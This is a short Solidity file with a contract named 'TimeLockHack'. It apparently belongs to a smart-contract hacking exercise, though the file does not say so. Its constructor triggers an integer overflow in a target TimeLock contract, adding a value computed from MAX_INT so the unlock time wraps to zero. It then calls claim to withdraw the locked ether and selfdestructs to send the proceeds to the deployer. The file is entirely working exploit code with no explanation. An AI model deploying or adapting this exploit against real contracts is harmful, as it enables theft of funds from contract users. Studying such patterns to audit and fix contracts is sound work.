pragma solidity ^0.5.0;


contract TimeLockHack {
    constructor(address payable timeLock) public payable {
        TimeLock tl= TimeLock(timeLock);
        if (timeLock.balance > 1 ether) {
           uint256 MAX_INT = 2**256 - 1;
           tl.increaseUnlockTime(MAX_INT -tl.unlockTime() + 1);
           tl.claim.value(msg.value)();
        }

        selfdestruct(msg.sender);
    }
}

contract TimeLock{
    function increaseUnlockTime(uint256 numSeconds) public;
    function claim() public payable;
    uint256 public unlockTime;
}